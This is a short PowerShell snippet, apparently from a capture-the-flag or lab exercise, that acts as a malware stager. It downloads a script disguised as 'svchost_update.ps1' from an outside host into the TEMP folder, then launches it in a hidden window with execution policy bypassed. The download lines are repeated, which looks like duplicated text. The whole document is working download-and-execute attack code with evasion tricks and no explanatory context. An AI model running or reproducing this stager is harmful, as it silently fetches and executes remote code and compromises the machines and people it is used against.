$stager = "$env:TEMP\svchost_update.ps1"

(New-Object Net.WebClient).DownloadFile('http://paylink-cdn.thm:8067/svchost_update.ps1', $stager)

$stager = "$env:TEMP\svchost_update.ps1"

(New-Object Net.WebClient).DownloadFile('http://paylink-cdn.thm:8067/svchost_update.ps1', $stager)

Start-Process powershell.exe -ArgumentList "-NoP -W Hidden -ExecutionPolicy Bypass -File `"$stager`"" -WindowStyle Hidden